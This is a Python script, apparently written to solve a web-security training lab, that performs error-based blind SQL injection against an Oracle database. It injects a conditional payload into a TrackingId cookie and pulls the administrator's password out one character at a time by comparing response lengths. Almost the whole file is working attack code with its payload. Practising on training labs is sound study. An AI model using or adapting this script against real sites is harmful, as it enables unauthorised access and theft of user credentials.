#This will extract the passwords one by one if you know the full length of the password from password_length.py
#This is an ORACLE-based database and is based on status code 500
import requests
import string

url = "https://0a1600a404578d9780b4fd81004a00bb.web-security-academy.net"
pass_char = string.ascii_lowercase + string.digits

#Crafting the method
def requestLab(url, payload):
    cookies = {
        "TrackingId":"X6BjOb8sZFs26Knw"+payload,
        "session":"XnRNGZlZlNiD02Npmnsjj8qpYNUY59YX"
    }
    r = requests.get(url, cookies=cookies)
#checking the response length for debugging
    #print("Response length:", len(r.text))
    return r.text

#Inserting the payload
#We know that the password length is 20 characters
pchar = ''
for i in range(1,21):
    for c in pass_char:
        PAYLOAD = (f"' AND (SELECT CASE WHEN SUBSTR(password,{i},1)='{c}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--")
        if len(requestLab(url, PAYLOAD)) == 2330:
            pchar += c
            print("Found a new char:", pchar)
            break
        
print("Password found:", pchar)
